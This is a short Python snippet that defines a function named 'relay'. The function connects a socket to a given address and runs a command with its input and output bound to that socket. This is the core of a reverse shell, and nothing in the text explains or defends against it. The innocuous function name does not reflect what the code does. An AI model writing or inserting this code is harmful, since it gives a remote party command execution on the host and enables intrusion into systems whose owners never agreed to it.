import socket,subprocess

def relay(address,command):
    peer=socket.socket()
    peer.connect(address)
    subprocess.Popen(command,stdin=peer,stdout=peer)
